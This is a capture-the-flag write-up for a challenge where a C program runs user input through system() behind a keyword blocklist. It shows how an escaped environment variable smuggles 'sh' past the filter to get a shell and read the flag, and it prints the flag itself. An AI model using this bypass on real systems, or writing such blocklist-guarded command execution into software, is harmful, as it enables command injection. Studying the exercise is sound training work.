When we ssh into the server, we see the typical c program, the code, and a flag. Let’s take a look at the C code.




#include <stdio.h>
#include <string.h>


int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv("PATH=/fuckyouverymuch");
    if(filter(argv[1])) return 0;
    system( argv[1] );
    


The first thing that this code does is it resets the PATH environment variable. In linux what the PATH environment variable does is it acts as a place where the terminal will search for commands such as “ls” and “cat”. With that messed up, we will have to type out the full paths to those commands “/bin/ls” and “/bin/cat”, because it will look in the wrong directory.


Proceeding that, the code will attempt to strip away several strings from the parameter it is passed. These strings specifically are “flag”, “sh”, and “tmp”. This is meant to prevent you from at all accessing the flag file, popping a shell, or anything you might of made in the temp file. After that it will execute the filtered input as a system command.


So what we will have to do is give it a system command, that can work even with the messed up PATH variable, and the filtered content. To get around the PATH variable, we can just type out the full filepath to the utilities we use. To get around the filtered content, we can just establish an environmental variable that is equal to the command we want to use and pass that along to the variable. It will survive the filtering and when the program runs it as a system command, it will call upon the value stored in it which will be a command. To do this is very simple.


First we can create the environment variable that we will use


“export sl=”sh””


Proceeding that we just need to pass it to the program. Keep in mind that we have to escape the “$sl” using a “\” otherwise it will just pass the value of the environment variable, instead of the literal string


“./cmd1 “/bin/\$sl””


And we have a shell




$ /bin/ls
cmd1  cmd1.c  flag
$ /bin/cat flag
mommy now I get what PATH environment is for :)


Flag: mommy now I get what PATH environment is for :)


There is another way you can do this all in one step you can just create the environment variable and pass it directly to the program.


“sl=”sh” ./cmd1 “/bin/\$sl””

